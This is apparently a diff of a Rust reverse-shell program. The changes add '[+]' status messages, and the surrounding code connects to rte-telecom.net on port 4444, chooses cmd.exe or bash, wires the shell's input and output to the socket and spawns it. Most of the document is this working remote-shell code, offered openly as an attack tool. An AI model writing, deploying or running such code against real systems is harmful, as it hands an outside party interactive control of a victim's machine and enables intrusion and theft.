@@ -9,10 +9,14 @@ use std::thread::sleep;
 use std::time::Duration;
 
 fn main() {
+    println!("[+] connecting to host...");
+        
     /* connect to host and port */
     let stream = TcpStream::connect("rte-telecom.net:4444")
         .expect("connection failed");
 
+    println!("[+] connected");
+    
     /* detect operating system
        * if Windows, cmd.exe
        * else, bash */
@@ -22,6 +26,8 @@ fn main() {
     };
 
     let mut proc = Command::new(shell);
+
+    println!("[+] creating {} shell", shell);
 
     /* redirect stdin to socket
      * redirect stdout/stderr to socket */
@@ -37,9 +43,13 @@ fn main() {
         proc.stdout(unsafe { Stdio::from_raw_fd(stream.as_raw_fd()) });
         proc.stderr(unsafe { Stdio::from_raw_fd(stream.as_raw_fd()) });
     }
+
+    println!("[+] using socket as file descriptors");
             
     /* launch shell */
     let mut child = proc.spawn().expect("spawn shell failed");
+
+    println!("[+] spawned shell process");
     
     /* while running, check if socket is alive */
     loop {
@@ -56,6 +66,8 @@ fn main() {
         sleep(Duration::from_secs(1));
     }
 
+    println!("[+] shutting down");
+    
     /* close socket */
     stream.shutdown(Shutdown::Both).ok();
 }
